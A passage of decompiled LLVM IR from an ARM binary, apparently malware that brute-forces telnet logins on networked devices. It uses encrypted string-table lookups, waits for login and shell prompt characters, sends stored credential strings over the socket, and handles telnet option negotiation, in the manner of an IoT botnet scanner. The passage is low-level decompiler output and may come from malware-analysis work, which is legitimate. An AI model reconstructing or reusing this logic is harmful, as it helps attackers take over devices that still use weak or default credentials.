  store i1 %v2_ef90, i1* %cpsr_c.global-to-local, align 1
  %v7_ef90 = icmp eq i8 %v3_efa4, 37
  store i1 %v7_ef90, i1* %cpsr_z.global-to-local, align 1
  %v1_ef94 = add i32 %v0_ef94, -1
  store i32 %v1_ef94, i32* %r3.global-to-local, align 4
  br i1 %v7_ef90, label %dec_label_pc_efb4, label %dec_label_pc_ef9c

dec_label_pc_ef9c:                                ; preds = %dec_label_pc_ef9c.preheader, %dec_label_pc_ef90
  %v0_ef94 = phi i32 [ %v2_ef74, %dec_label_pc_ef9c.preheader ], [ %v1_ef94, %dec_label_pc_ef90 ]
  %v0_ef9c = phi i32 [ %v1_ef3c, %dec_label_pc_ef9c.preheader ], [ %v1_ef9c, %dec_label_pc_ef90 ]
  %v1_ef9c = add i32 %v0_ef9c, -1
  store i32 %v1_ef9c, i32* %r1.global-to-local, align 4
  %v2_ef9c = icmp ne i32 %v0_ef9c, 0
  store i1 %v2_ef9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef9c = icmp eq i32 %v0_ef9c, 1
  store i1 %v7_ef9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef9c, label %dec_label_pc_ed78.backedge.thread561, label %dec_label_pc_efa4

dec_label_pc_efa4:                                ; preds = %dec_label_pc_ef9c
  %v1_efa4 = add i32 %v0_ef94, -2
  %v2_efa4 = inttoptr i32 %v1_efa4 to i8*
  %v3_efa4 = load i8, i8* %v2_efa4, align 1
  %v4_efa4 = zext i8 %v3_efa4 to i32
  store i32 %v4_efa4, i32* %r2.global-to-local, align 4
  %v2_efa8 = icmp ugt i8 %v3_efa4, 61
  store i1 %v2_efa8, i1* %cpsr_c.global-to-local, align 1
  %v7_efa8 = icmp eq i8 %v3_efa4, 62
  store i1 %v7_efa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efa8, label %dec_label_pc_efb4, label %bb429

bb429:                                            ; preds = %dec_label_pc_efa4
  %v3_efac = icmp ugt i8 %v3_efa4, 57
  store i1 %v3_efac, i1* %cpsr_c.global-to-local, align 1
  %v8_efac = icmp eq i8 %v3_efa4, 58
  store i1 %v8_efac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_efac, label %dec_label_pc_efb4, label %dec_label_pc_ef80

dec_label_pc_efb4:                                ; preds = %dec_label_pc_efa4, %bb429, %dec_label_pc_ef90, %dec_label_pc_ef88, %dec_label_pc_ef80, %dec_label_pc_ef6c, %dec_label_pc_ef48, %dec_label_pc_ef64, %dec_label_pc_ef5c, %bb428
  %v0_efb8 = phi i32 [ %v1_ef3c, %dec_label_pc_ef6c ], [ %v1_ef3c, %dec_label_pc_ef48 ], [ %v1_ef3c, %dec_label_pc_ef64 ], [ %v1_ef3c, %dec_label_pc_ef5c ], [ %v1_ef3c, %bb428 ], [ %v1_ef9c, %dec_label_pc_ef80 ], [ %v1_ef9c, %dec_label_pc_ef88 ], [ %v1_ef9c, %dec_label_pc_ef90 ], [ %v1_ef9c, %bb429 ], [ %v1_ef9c, %dec_label_pc_efa4 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_efb8 = add i32 %v0_efb8, 1
  store i32 %v1_efb8, i32* @r7, align 4
  %v1_efbc = call i32 @table_unlock_val(i32 8)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_efcc = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_efcc, i32* %r0.global-to-local, align 4
  %v3_efd0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_efd0, i32* %r2.global-to-local, align 4
  store i32 %v3_efcc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_efdc = load i32, i32* @r6, align 4
  %v1_efdc = add i32 %v0_efdc, 4
  %v2_efdc = inttoptr i32 %v1_efdc to i32*
  %v3_efdc = load i32, i32* %v2_efdc, align 4
  store i32 %v3_efdc, i32* %r0.global-to-local, align 4
  %v4_efe0 = call i32 @__libc_send(i32 %v3_efdc, i32 %v3_efcc, i32 %v3_efd0, i32 16384)
  store i32 %v4_efe0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_eff0 = load i32, i32* @r6, align 4
  %v1_eff0 = add i32 %v0_eff0, 4
  %v2_eff0 = inttoptr i32 %v1_eff0 to i32*
  %v3_eff0 = load i32, i32* %v2_eff0, align 4
  store i32 %v3_eff0, i32* %r0.global-to-local, align 4
  %v4_eff4 = call i32 @__libc_send(i32 %v3_eff0, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_effc = call i32 @table_lock_val(i32 8)
  store i32 %v1_effc, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f004 = load i32, i32* @r6, align 4
  %v2_f004 = add i32 %v1_f004, 12
  %v3_f004 = inttoptr i32 %v2_f004 to i32*
  store i32 10, i32* %v3_f004, align 4
  br label %dec_label_pc_ef10

dec_label_pc_f00c:                                ; preds = %dec_label_pc_edf4
  %v1_f00c = add i32 %v0_edf4, 24
  %v2_f00c = inttoptr i32 %v1_f00c to i32*
  %v3_f00c = load i32, i32* %v2_f00c, align 4
  store i32 %v3_f00c, i32* %r2.global-to-local, align 4
  %v1_f010 = add i32 %v3_f00c, -1
  store i32 %v1_f010, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f014 = icmp eq i32 %v1_f010, 0
  store i1 %v2_f014, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f010, 1
  br i1 %tmp430, label %dec_label_pc_ed78.backedge.thread, label %dec_label_pc_f01c

dec_label_pc_f01c:                                ; preds = %dec_label_pc_f00c
  %v2_f01c = add i32 %v1_f010, %v0_edf4
  store i32 %v2_f01c, i32* %r3.global-to-local, align 4
  %v1_f020 = add i32 %v2_f01c, 28
  %v2_f020 = inttoptr i32 %v1_f020 to i8*
  %v3_f020 = load i8, i8* %v2_f020, align 1
  %v4_f020 = zext i8 %v3_f020 to i32
  store i32 %v4_f020, i32* %r3.global-to-local, align 4
  %v2_f024 = icmp ugt i8 %v3_f020, 61
  store i1 %v2_f024, i1* %cpsr_c.global-to-local, align 1
  %v7_f024 = icmp eq i8 %v3_f020, 62
  store i1 %v7_f024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f024, label %dec_label_pc_f088, label %bb431

bb431:                                            ; preds = %dec_label_pc_f01c
  %v3_f028 = icmp ugt i8 %v3_f020, 57
  store i1 %v3_f028, i1* %cpsr_c.global-to-local, align 1
  %v8_f028 = icmp eq i8 %v3_f020, 58
  store i1 %v8_f028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f028, label %dec_label_pc_f088, label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %bb431
  %v2_f030 = icmp ugt i8 %v3_f020, 35
  store i1 %v2_f030, i1* %cpsr_c.global-to-local, align 1
  %v7_f030 = icmp eq i8 %v3_f020, 36
  store i1 %v7_f030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f030, label %dec_label_pc_f088, label %dec_label_pc_f038

dec_label_pc_f038:                                ; preds = %dec_label_pc_f030
  %v2_f038 = icmp ugt i8 %v3_f020, 34
  store i1 %v2_f038, i1* %cpsr_c.global-to-local, align 1
  %v7_f038 = icmp eq i8 %v3_f020, 35
  store i1 %v7_f038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f038, label %dec_label_pc_f088, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f038
  %v2_f040 = icmp ugt i8 %v3_f020, 36
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i8 %v3_f020, 37
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f040, label %dec_label_pc_f088, label %dec_label_pc_f070.preheader

dec_label_pc_f070.preheader:                      ; preds = %dec_label_pc_f040
  %v3_f044 = add i32 %v0_edf4, 28
  %v2_f048 = add i32 %v3_f044, %v3_f00c
  store i32 %v2_f048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f070

dec_label_pc_f054:                                ; preds = %bb432
  %v2_f054 = icmp ugt i8 %v3_f078, 35
  store i1 %v2_f054, i1* %cpsr_c.global-to-local, align 1
  %v7_f054 = icmp eq i8 %v3_f078, 36
  store i1 %v7_f054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f054, label %dec_label_pc_f088, label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f054
  %v2_f05c = icmp ugt i8 %v3_f078, 34
  store i1 %v2_f05c, i1* %cpsr_c.global-to-local, align 1
  %v7_f05c = icmp eq i8 %v3_f078, 35
  store i1 %v7_f05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f05c, label %dec_label_pc_f088, label %dec_label_pc_f064

dec_label_pc_f064:                                ; preds = %dec_label_pc_f05c
  %v2_f064 = icmp ugt i8 %v3_f078, 36
  store i1 %v2_f064, i1* %cpsr_c.global-to-local, align 1
  %v7_f064 = icmp eq i8 %v3_f078, 37
  store i1 %v7_f064, i1* %cpsr_z.global-to-local, align 1
  %v1_f068 = add i32 %v0_f068, -1
  store i32 %v1_f068, i32* %r3.global-to-local, align 4
  br i1 %v7_f064, label %dec_label_pc_f088, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f070.preheader, %dec_label_pc_f064
  %v0_f068 = phi i32 [ %v2_f048, %dec_label_pc_f070.preheader ], [ %v1_f068, %dec_label_pc_f064 ]
  %v0_f070 = phi i32 [ %v1_f010, %dec_label_pc_f070.preheader ], [ %v1_f070, %dec_label_pc_f064 ]
  %v1_f070 = add i32 %v0_f070, -1
  store i32 %v1_f070, i32* %r1.global-to-local, align 4
  %v2_f070 = icmp ne i32 %v0_f070, 0
  store i1 %v2_f070, i1* %cpsr_c.global-to-local, align 1
  %v7_f070 = icmp eq i32 %v0_f070, 1
  store i1 %v7_f070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f070, label %dec_label_pc_ed78.backedge.thread561, label %dec_label_pc_f078

dec_label_pc_f078:                                ; preds = %dec_label_pc_f070
  %v1_f078 = add i32 %v0_f068, -2
  %v2_f078 = inttoptr i32 %v1_f078 to i8*
  %v3_f078 = load i8, i8* %v2_f078, align 1
  %v4_f078 = zext i8 %v3_f078 to i32
  store i32 %v4_f078, i32* %r2.global-to-local, align 4
  %v2_f07c = icmp ugt i8 %v3_f078, 61
  store i1 %v2_f07c, i1* %cpsr_c.global-to-local, align 1
  %v7_f07c = icmp eq i8 %v3_f078, 62
  store i1 %v7_f07c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f07c, label %dec_label_pc_f088, label %bb432

bb432:                                            ; preds = %dec_label_pc_f078
  %v3_f080 = icmp ugt i8 %v3_f078, 57
  store i1 %v3_f080, i1* %cpsr_c.global-to-local, align 1
  %v8_f080 = icmp eq i8 %v3_f078, 58
  store i1 %v8_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f080, label %dec_label_pc_f088, label %dec_label_pc_f054

dec_label_pc_f088:                                ; preds = %dec_label_pc_f078, %bb432, %dec_label_pc_f064, %dec_label_pc_f05c, %dec_label_pc_f054, %dec_label_pc_f040, %dec_label_pc_f01c, %dec_label_pc_f038, %dec_label_pc_f030, %bb431
  %v0_f08c = phi i32 [ %v1_f010, %dec_label_pc_f040 ], [ %v1_f010, %dec_label_pc_f01c ], [ %v1_f010, %dec_label_pc_f038 ], [ %v1_f010, %dec_label_pc_f030 ], [ %v1_f010, %bb431 ], [ %v1_f070, %dec_label_pc_f054 ], [ %v1_f070, %dec_label_pc_f05c ], [ %v1_f070, %dec_label_pc_f064 ], [ %v1_f070, %bb432 ], [ %v1_f070, %dec_label_pc_f078 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f08c = add i32 %v0_f08c, 1
  store i32 %v1_f08c, i32* @r7, align 4
  %v1_f090 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f0a0 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f0a0, i32* %r0.global-to-local, align 4
  %v3_f0a4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f0a4, i32* %r2.global-to-local, align 4
  store i32 %v3_f0a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f0b0 = load i32, i32* @r6, align 4
  %v1_f0b0 = add i32 %v0_f0b0, 4
  %v2_f0b0 = inttoptr i32 %v1_f0b0 to i32*
  %v3_f0b0 = load i32, i32* %v2_f0b0, align 4
  store i32 %v3_f0b0, i32* %r0.global-to-local, align 4
  %v4_f0b4 = call i32 @__libc_send(i32 %v3_f0b0, i32 %v3_f0a0, i32 %v3_f0a4, i32 16384)
  store i32 %v4_f0b4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f0c4 = load i32, i32* @r6, align 4
  %v1_f0c4 = add i32 %v0_f0c4, 4
  %v2_f0c4 = inttoptr i32 %v1_f0c4 to i32*
  %v3_f0c4 = load i32, i32* %v2_f0c4, align 4
  store i32 %v3_f0c4, i32* %r0.global-to-local, align 4
  %v4_f0c8 = call i32 @__libc_send(i32 %v3_f0c4, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f0d0 = call i32 @table_lock_val(i32 7)
  store i32 %v1_f0d0, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f0d8 = load i32, i32* @r6, align 4
  %v2_f0d8 = add i32 %v1_f0d8, 12
  %v3_f0d8 = inttoptr i32 %v2_f0d8 to i32*
  store i32 9, i32* %v3_f0d8, align 4
  br label %dec_label_pc_ef10

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_edf4
  %v1_f0e0 = add i32 %v0_edf4, 24
  %v2_f0e0 = inttoptr i32 %v1_f0e0 to i32*
  %v3_f0e0 = load i32, i32* %v2_f0e0, align 4
  store i32 %v3_f0e0, i32* %r1.global-to-local, align 4
  %v0_f0e4 = load i32, i32* @sb, align 4
  store i32 %v0_f0e4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f0ec166 = icmp eq i32 %v3_f0e0, 0
  store i1 %v3_f0ec166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f0ec166, i1* %cpsr_z.global-to-local, align 1
  %v6_f0f0173 = icmp sgt i32 %v3_f0e0, 0
  br i1 %v6_f0f0173, label %dec_label_pc_f0f4.preheader, label %dec_label_pc_f1a0

dec_label_pc_f0ec.loopexit:                       ; preds = %dec_label_pc_f110
  %v2_f118 = add i32 %v1_f118, 2
  store i32 %v2_f118, i32* @r4, align 4
  %v2_f11c = add i32 %v1_f11c, 2
  store i32 %v2_f11c, i32* @r7, align 4
  %v3_f0ec = icmp uge i32 %v2_f11c, %v1_f0ec
  store i1 %v3_f0ec, i1* %cpsr_c.global-to-local, align 1
  %v9_f0ec = icmp eq i32 %v2_f11c, %v1_f0ec
  store i1 %v9_f0ec, i1* %cpsr_z.global-to-local, align 1
  %v6_f0f0 = icmp slt i32 %v2_f11c, %v1_f0ec
  br i1 %v6_f0f0, label %dec_label_pc_f0f4.preheader, label %dec_label_pc_f1a0

dec_label_pc_f0f4.preheader:                      ; preds = %dec_label_pc_f0e0, %dec_label_pc_f0ec.loopexit
  %v6_f1a8273 = phi i32 [ %v6_f1a8274, %dec_label_pc_f0ec.loopexit ], [ %v0_edf4, %dec_label_pc_f0e0 ]
  %v1_f11c262 = phi i32 [ %v2_f11c, %dec_label_pc_f0ec.loopexit ], [ 0, %dec_label_pc_f0e0 ]
  %v1_f100260 = phi i32 [ %v1_f0ec, %dec_label_pc_f0ec.loopexit ], [ %v3_f0e0, %dec_label_pc_f0e0 ]
  %v0_f0f4258 = phi i32 [ %v2_f118, %dec_label_pc_f0ec.loopexit ], [ %v0_f0e4, %dec_label_pc_f0e0 ]
  br label %dec_label_pc_f0f4

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_f0f4.preheader, %dec_label_pc_f184
  %v6_f1a8274 = phi i32 [ %v6_f1a8273, %dec_label_pc_f0f4.preheader ], [ %v0_f18c, %dec_label_pc_f184 ]
  %v1_f11c = phi i32 [ %v1_f11c262, %dec_label_pc_f0f4.preheader ], [ %v1_f190, %dec_label_pc_f184 ]
  %v1_f0ec = phi i32 [ %v1_f100260, %dec_label_pc_f0f4.preheader ], [ %v3_f18c, %dec_label_pc_f184 ]
  %v1_f118 = phi i32 [ %v0_f0f4258, %dec_label_pc_f0f4.preheader ], [ %v1_f198, %dec_label_pc_f184 ]
  %v1_f0f4 = inttoptr i32 %v1_f118 to i8*
  %v2_f0f4 = load i8, i8* %v1_f0f4, align 1
  %v3_f0f4 = zext i8 %v2_f0f4 to i32
  store i32 %v3_f0f4, i32* @r3, align 4
  %v2_f0f8 = icmp eq i8 %v2_f0f4, -1
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0f8, label %dec_label_pc_f100, label %dec_label_pc_f1a0

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0f4
  %v0_f100 = load i32, i32* @sb, align 4
  %v2_f100 = add i32 %v0_f100, %v1_f0ec
  store i32 %v2_f100, i32* %r2.global-to-local, align 4
  %v1_f104 = add i32 %v1_f118, 1
  store i32 %v1_f104, i32* @r5, align 4
  %v3_f108 = icmp uge i32 %v2_f100, %v1_f104
  store i1 %v3_f108, i1* %cpsr_c.global-to-local, align 1
  %v9_f108 = icmp eq i32 %v2_f100, %v1_f104
  store i1 %v9_f108, i1* %cpsr_z.global-to-local, align 1
  %v2_f10c = xor i1 %v3_f108, true
  %v3_f10c = or i1 %v9_f108, %v2_f10c
  br i1 %v3_f10c, label %dec_label_pc_f1a0, label %dec_label_pc_f110

dec_label_pc_f110:                                ; preds = %dec_label_pc_f100
  %v2_f110 = inttoptr i32 %v1_f104 to i8*
  %v3_f110 = load i8, i8* %v2_f110, align 1
  %v4_f110 = zext i8 %v3_f110 to i32
  store i32 %v4_f110, i32* @r3, align 4
  %v2_f114 = icmp eq i8 %v3_f110, -1
  store i1 %v2_f114, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f114, label %dec_label_pc_f0ec.loopexit, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f110
  %v2_f124 = icmp ugt i8 %v3_f110, -4
  store i1 %v2_f124, i1* %cpsr_c.global-to-local, align 1
  %v7_f124 = icmp eq i8 %v3_f110, -3
  store i1 %v7_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f124, label %dec_label_pc_f6b8, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124
  %v1_f12c = add i32 %v1_f118, 2
  store i32 %v1_f12c, i32* @r3, align 4
  %v3_f130 = icmp uge i32 %v2_f100, %v1_f12c
  store i1 %v3_f130, i1* %cpsr_c.global-to-local, align 1
  %v9_f130 = icmp eq i32 %v2_f100, %v1_f12c
  store i1 %v9_f130, i1* %cpsr_z.global-to-local, align 1
  %v2_f134 = xor i1 %v3_f130, true
  %v3_f134 = or i1 %v9_f130, %v2_f134
  br i1 %v3_f134, label %dec_label_pc_f1a0, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f71c, %bb454, %.thread138, %dec_label_pc_f12c
  %v0_f138 = load i32, i32* @r5, align 4
  %v1_f138 = inttoptr i32 %v0_f138 to i8*
  %v2_f138 = load i8, i8* %v1_f138, align 1
  %v3_f138 = zext i8 %v2_f138 to i32
  store i32 %v3_f138, i32* %r3.global-to-local, align 4
  %v2_f13c = icmp ugt i8 %v2_f138, -4
  store i1 %v2_f13c, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp eq i8 %v2_f138, -3
  store i1 %v7_f13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f13c, label %.thread96, label %dec_label_pc_f14c

.thread96:                                        ; preds = %dec_label_pc_f138
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f138, align 1
  %v0_f148.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f148.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f14cthread-pre-split_crit_edge

.thread96.dec_label_pc_f14cthread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f14c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f138, %.thread96.dec_label_pc_f14cthread-pre-split_crit_edge
  %v0_f14c.pr = phi i32 [ %v0_f14c.pr.pre, %.thread96.dec_label_pc_f14cthread-pre-split_crit_edge ], [ %v3_f138, %dec_label_pc_f138 ]
  %v2_f14c = icmp ugt i32 %v0_f14c.pr, 250
  store i1 %v2_f14c, i1* %cpsr_c.global-to-local, align 1
  %v7_f14c = icmp eq i32 %v0_f14c.pr, 251
  store i1 %v7_f14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f14c, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f14c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f154 = load i32, i32* @r5, align 4
  %v4_f154 = inttoptr i32 %v3_f154 to i8*
  store i8 -3, i8* %v4_f154, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f14c, %.thread96, %bb433
  %v0_f158 = load i32, i32* @r4, align 4
  %v1_f158 = add i32 %v0_f158, 2
  %v2_f158 = inttoptr i32 %v1_f158 to i8*
  %v3_f158 = load i8, i8* %v2_f158, align 1
  %v4_f158 = zext i8 %v3_f158 to i32
  store i32 %v4_f158, i32* %r3.global-to-local, align 4
  %v2_f15c = icmp ugt i8 %v3_f158, -4
  store i1 %v2_f15c, i1* %cpsr_c.global-to-local, align 1
  %v7_f15c = icmp eq i8 %v3_f158, -3
  store i1 %v7_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f15c, label %.thread100, label %dec_label_pc_f16c

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f158, align 1
  %v0_f168.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f168.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f16cthread-pre-split_crit_edge

.thread100.dec_label_pc_f16cthread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f16c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f16c

dec_label_pc_f16c:                                ; preds = %.thread99, %.thread100.dec_label_pc_f16cthread-pre-split_crit_edge
  %v0_f16c.pr = phi i32 [ %v0_f16c.pr.pre, %.thread100.dec_label_pc_f16cthread-pre-split_crit_edge ], [ %v4_f158, %.thread99 ]
  %v2_f16c = icmp ugt i32 %v0_f16c.pr, 250
  store i1 %v2_f16c, i1* %cpsr_c.global-to-local, align 1
  %v7_f16c = icmp eq i32 %v0_f16c.pr, 251
  store i1 %v7_f16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f16c, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f16c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f174 = load i32, i32* @r4, align 4
  %v4_f174 = add i32 %v3_f174, 2
  %v5_f174 = inttoptr i32 %v4_f174 to i8*
  store i8 -3, i8* %v5_f174, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f16c, %.thread100, %bb434
  %v0_f178 = load i32, i32* @r6, align 4
  %v1_f178 = add i32 %v0_f178, 4
  %v2_f178 = inttoptr i32 %v1_f178 to i32*
  %v3_f178 = load i32, i32* %v2_f178, align 4
  store i32 %v3_f178, i32* %r0.global-to-local, align 4
  %v0_f17c = load i32, i32* @r4, align 4
  br label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f830, %.thread103
  %v0_f188 = phi i32 [ %v3_f844, %dec_label_pc_f830 ], [ %v3_f178, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f6d0, %dec_label_pc_f830 ], [ %v0_f17c, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_f830 ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f188 = call i32 @__libc_send(i32 %v0_f188, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f188, i32* %r0.global-to-local, align 4
  %v0_f18c = load i32, i32* @r6, align 4
  %v1_f18c = add i32 %v0_f18c, 24
  %v2_f18c = inttoptr i32 %v1_f18c to i32*
  %v3_f18c = load i32, i32* %v2_f18c, align 4
  store i32 %v3_f18c, i32* %r1.global-to-local, align 4
  %v0_f190 = load i32, i32* @r7, align 4
  %v1_f190 = add i32 %v0_f190, 3
  store i32 %v1_f190, i32* @r7, align 4
  %v3_f194 = icmp uge i32 %v1_f190, %v3_f18c
  store i1 %v3_f194, i1* %cpsr_c.global-to-local, align 1
  %v9_f194 = icmp eq i32 %v1_f190, %v3_f18c
  store i1 %v9_f194, i1* %cpsr_z.global-to-local, align 1
  %v0_f198 = load i32, i32* @r4, align 4
  %v1_f198 = add i32 %v0_f198, 3
  store i32 %v1_f198, i32* @r4, align 4
  %v5_f19c = icmp slt i32 %v1_f190, %v3_f18c
  br i1 %v5_f19c, label %dec_label_pc_f0f4, label %dec_label_pc_f1a0

dec_label_pc_f1a0:                                ; preds = %dec_label_pc_f0ec.loopexit, %dec_label_pc_f0f4, %dec_label_pc_f184, %dec_label_pc_f12c, %dec_label_pc_f100, %dec_label_pc_f0e0, %dec_label_pc_f6b8.dec_label_pc_f1a0.loopexit_crit_edge
  %v6_f1a8 = phi i32 [ %v0_f6e8, %dec_label_pc_f6b8.dec_label_pc_f1a0.loopexit_crit_edge ], [ %v0_edf4, %dec_label_pc_f0e0 ], [ %v6_f1a8274, %dec_label_pc_f0f4 ], [ %v0_f18c, %dec_label_pc_f184 ], [ %v6_f1a8274, %dec_label_pc_f12c ], [ %v6_f1a8274, %dec_label_pc_f100 ], [ %v6_f1a8274, %dec_label_pc_f0ec.loopexit ]
  %v0_f1a0 = phi i32 [ %v0_f1a0.pre.pre, %dec_label_pc_f6b8.dec_label_pc_f1a0.loopexit_crit_edge ], [ 0, %dec_label_pc_f0e0 ], [ %v1_f11c, %dec_label_pc_f0f4 ], [ %v1_f190, %dec_label_pc_f184 ], [ %v1_f11c, %dec_label_pc_f12c ], [ %v1_f11c, %dec_label_pc_f100 ], [ %v2_f11c, %dec_label_pc_f0ec.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1a0 = icmp eq i32 %v0_f1a0, 0
  store i1 %v2_f1a0, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f1a0, 1
  br i1 %tmp435, label %dec_label_pc_f58c, label %bb436

bb436:                                            ; preds = %dec_label_pc_f1a0
  store i32 3, i32* @r3, align 4
  %v7_f1a8 = add i32 %v6_f1a8, 12
  %v8_f1a8 = inttoptr i32 %v7_f1a8 to i32*
  store i32 3, i32* %v8_f1a8, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_edf4
  %v1_f1b0 = add i32 %v0_edf4, 24
  %v2_f1b0 = inttoptr i32 %v1_f1b0 to i32*
  %v3_f1b0 = load i32, i32* %v2_f1b0, align 4
  store i32 %v3_f1b0, i32* %r2.global-to-local, align 4
  %v1_f1b4 = add i32 %v3_f1b0, -1
  store i32 %v1_f1b4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1b8 = icmp eq i32 %v1_f1b4, 0
  store i1 %v2_f1b8, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f1b4, 1
  br i1 %tmp437, label %dec_label_pc_ed78.backedge.thread, label %dec_label_pc_f1c0

dec_label_pc_f1c0:                                ; preds = %dec_label_pc_f1b0
  %v2_f1c0 = add i32 %v1_f1b4, %v0_edf4
  store i32 %v2_f1c0, i32* %r3.global-to-local, align 4
  %v1_f1c4 = add i32 %v2_f1c0, 28
  %v2_f1c4 = inttoptr i32 %v1_f1c4 to i8*
  %v3_f1c4 = load i8, i8* %v2_f1c4, align 1
  %v4_f1c4 = zext i8 %v3_f1c4 to i32
  store i32 %v4_f1c4, i32* %r3.global-to-local, align 4
  %v2_f1c8 = icmp ugt i8 %v3_f1c4, 61
  store i1 %v2_f1c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c8 = icmp eq i8 %v3_f1c4, 62
  store i1 %v7_f1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1c8, label %dec_label_pc_f22c, label %bb438

bb438:                                            ; preds = %dec_label_pc_f1c0
